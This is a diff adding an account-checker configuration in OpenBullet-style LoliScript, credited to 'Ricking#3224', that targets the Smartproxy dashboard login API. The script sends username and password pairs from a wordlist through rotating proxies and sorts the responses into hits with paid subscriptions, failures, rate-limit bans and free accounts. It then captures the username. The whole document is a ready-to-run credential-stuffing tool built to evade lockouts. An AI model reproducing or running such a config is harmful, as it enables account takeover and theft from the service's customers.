@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Smartproxy ",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-06T14:16:21.0901295-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GUID FUNCTION GenerateGUID -> VAR "1" 
+
+REQUEST POST "https://dashboard.smartproxy.com/api/v1/users/login/" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"type\":\"sp\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 75" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "cookie: __cfduid=ddfae20fcd187d89a604130460eb77c8a1582369276; paddlejs_checkout_variant={\"inTest\":true,\"controlGroup\":false,\"isForced\":false,\"variant\":\"multipage-radio-payment\"}; paddlejs_campaign_referrer=smartproxy.com; driftt_aid=c91f7333-af6a-4564-ac30-fbaa8126bd4c; fingerprint=7e52027b60c5d18fa4f81a73506613be; DFTT_END_USER_PREV_BOOTSTRAPPED=true; driftt_sid=d1d6ae1a-38fd-450e-9a92-1cd73466e791" 
+  HEADER "origin: https://dashboard.smartproxy.com" 
+  HEADER "referer: https://dashboard.smartproxy.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"has_subscription\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Unable to log in with provided credentials" 
+  KEYCHAIN Ban OR 
+    KEY "Too many unsuccessful attempts, try again later" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"has_subscription\":false" 
+
+PARSE "<SOURCE>" LR "\",\"username\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
